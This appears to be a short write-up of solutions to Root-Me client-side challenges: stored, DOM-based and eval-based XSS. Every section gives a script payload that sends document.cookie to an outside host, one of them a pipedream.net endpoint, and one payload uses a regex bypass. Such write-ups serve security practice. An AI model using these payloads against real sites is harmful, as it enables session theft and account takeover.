# Rootme-App-Client
App Client Challenges Summary

### XSS- Stored 1
Post a message with content is the following:
`<script>fetch("URL?c="+document.cookie)</script>
`
### XSS - Stored 2
Post a random message, then Ctrl + U to view source code. 

There are 2 style definitions : `invite` & `admin`.

Besides, when open cookies manage, we see a value of `status` is `invite`. 

Change this value into `admin` and try posting a message, this change will affect to tag `i` after message title.

So we're going to exploit this.

Change `status` cookie into `"><script>fetch("URL?c="+document.cookie)</script>` and post a message

### XSS DOM Based - Introduction

Submit a random number, we will see url has a param `number`. 

Ctrl + U to view source code. `number` variable get value from URL param.

Exploit this.

Submit number `'; fetch("https://eo944ovuf06595y.m.pipedream.net?c="+document.cookie)//`. 

This will break `''` of `number` variable, add `fetch` into script.

Submit URL in `Contact` page with param `RootmeURL?number='; fetch("https://eo944ovuf06595y.m.pipedream.net?c="+document.cookie)//`

### XSS DOM Based - Eval
This web use regex  /^\d+[\+|\-|\*|\/]\d+/ to check input. We can bypass by using the following input:

``1*24+";window.location.href=`URL?c=`+document.cookie;//"``
